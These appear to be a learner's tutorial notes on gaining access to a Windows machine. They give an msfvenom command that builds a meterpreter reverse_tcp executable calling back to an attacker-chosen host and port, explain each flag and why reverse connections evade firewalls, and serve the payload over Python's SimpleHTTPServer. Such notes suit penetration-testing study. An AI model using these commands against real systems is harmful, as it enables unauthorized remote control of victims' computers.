# PART 1 — Getting access (Reverse Shell)
## Step 1 Creating a Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Your_IP_address LPORT=1234 -f exe > payload.exe

msfvenom -> Tool to create Payloads (Malicious Files)
-p means payload which you want to create, here we are using a payload of type `windows/x64/meterpreter/reverse_tcp`
windows - target OS
x64 - 64-bit windows
meterpreter - This is the type of shell/session you want
Meterpreter is a more advanced shell than a normal command shell. It gives you features like:
- file upload/download
- process migration
- screenshot
- privilege escalation helpers
- system info collection

reverse_tcp
the victim machine will make connection back to the attacker over TCP
why reverse?
Because instead of you connecting into the target , the target connects back to you
That matters because:
- many firewalls block incoming connections
- outgoing connections are often allowed

LHOST - It is the IP machine the victim should connect back to
LPORT - This is the port on your attacking machine that will receive the reverse connection

-f -> This tells msfvenom what kind of output file to generate
-f exe -> generate payload in windows executable format
    > -> take the output of the command and write it into a file
payload.exe -> This is the filename where the output will be saved.

# Step 2: Host the file
python -m SimpleHTTPServer 80
 -m -> run a python module as a script, instead of running a .py file directly , python will one of its module
 SimpleHTTPServer -> It starts a simple web server so files in your current folder can be served over HTTP.
80 -> listen on port 80
Run Python’s simple web server on port 80 so other machines can download files from this folder over HTTP.

